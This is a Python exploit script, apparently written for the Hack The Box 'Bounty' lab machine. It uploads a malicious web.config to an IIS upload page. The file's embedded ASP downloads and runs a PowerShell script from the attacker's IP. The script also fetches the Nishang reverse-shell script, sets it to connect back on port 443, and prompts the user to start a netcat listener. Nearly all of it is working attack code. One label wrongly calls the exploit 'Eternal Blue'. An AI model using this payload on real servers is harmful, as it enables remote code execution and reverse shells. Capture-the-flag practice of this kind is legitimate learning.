import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder
import textwrap

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Bounty
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] merlin","[+] system32", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.93" # change this if change ip on htb.


def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/transfer.aspx");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Bounty Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------


main_url="http://10.10.10.93/transfer.aspx"
def submit_file_and_rce():
    try:
            
        s = requests.Session()
        
        #print(r.text)
        r = s.get(main_url)
        viewState = re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0]
        eventValidation = re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0]
        #print(viewState+"\n"+eventValidation)
        
        post_data={
            '__VIEWSTATE': viewState,
            '__EVENTVALIDATION': eventValidation,
            'btnUpload': 'Upload'
        }
        
        
        # https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
        payload = textwrap.dedent(f"""\
        <?xml version="1.0" encoding="UTF-8"?>
        <configuration>
        <system.webServer>
            <handlers accessPolicy="Read, Script, Write">
                <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
            </handlers>
            <security>
                <requestFiltering>
                    <fileExtensions>
                        <remove fileExtension=".config" />
                    </fileExtensions>
                    <hiddenSegments>
                        <remove segment="web.config" />
                    </hiddenSegments>
                </requestFiltering>
            </security>
        </system.webServer>
        </configuration>
        <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
        <%
        Set co = CreateObject("WScript.Shell")
        Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://{machine_ip}/PS.ps1')")
        output = cte.StdOut.Readall()
        Response.write(output)
        %>
        %>
        -->
""")

        fileUploaded={'fileUpload1': ('web.config', payload)}
        input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Exploit - Eternal Blue] > " + Fore.WHITE + f"Press ENTER if u ready...")
        s.post(main_url, data=post_data, files=fileUploaded)
        s.get("http://10.10.10.93/uploadedFiles/web.config")
        #print(response.text)
    except:
        pass    
#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","www-data connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.YELLOW + f"Path Exploit: http://{target_machine}/transfer.aspx");cm.sleep(0.2)
                print(tmsg,Fore.RED + f"[Exploit - www-data] > " + Fore.YELLOW + f"Download netcat.exe > " + Fore.LIGHTCYAN_EX + "https://eternallybored.org/misc/netcat/");cm.sleep(.5)
                commands_send("wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1")
                commands_send("mv Invoke-PowerShellTcp.ps1 PS.ps1")
                commands_send(f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {machine_ip} -Port 443' >> PS.ps1")
                print(tmsg,Fore.RED + f"[Exploit - www-data] > " + Fore.YELLOW + f"Download Successly .ps1 file > " + Fore.LIGHTCYAN_EX + "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit - www-data] > " + Fore.YELLOW + f"In other cmd type command > " + Fore.LIGHTCYAN_EX + "python3 -m http.server 80");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit - www-data] > " + Fore.YELLOW + f"In other cmd type command > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
                submit_file_and_rce()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","system32 user connection"))
                print(tmsg,Fore.RED + f"[Exploit - sytem32] > " + Fore.YELLOW + f"Read file for exploit > " + Fore.LIGHTCYAN_EX + "https://pastebin.com/b6Qq6PXg");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Password file > " + Fore.LIGHTCYAN_EX + "emptyfile");cm.sleep(.5)
                print(tmsg,Fore.LIGHTBLUE_EX +f"[system32] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
